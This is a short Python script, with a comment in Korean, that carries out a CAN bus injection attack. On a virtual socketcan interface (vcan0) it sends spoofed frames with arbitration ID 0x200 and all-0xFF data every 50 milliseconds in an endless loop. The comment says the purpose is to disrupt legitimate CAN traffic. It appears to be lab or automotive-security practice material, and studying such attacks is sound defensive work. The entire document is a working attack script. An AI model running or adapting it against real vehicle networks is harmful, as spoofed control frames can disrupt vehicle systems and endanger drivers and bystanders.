import can
import time

bus = can.Bus(channel='vcan0', interface='socketcan')
#원래의 can통신을 방해하는 임의의 패킷을 만들어 injection공격 시행
while True:
    msg = can.Message(
        arbitration_id=0x200,
        data=[0xFF]*8,
        is_extended_id=False
    )
    bus.send(msg)
    time.sleep(0.05)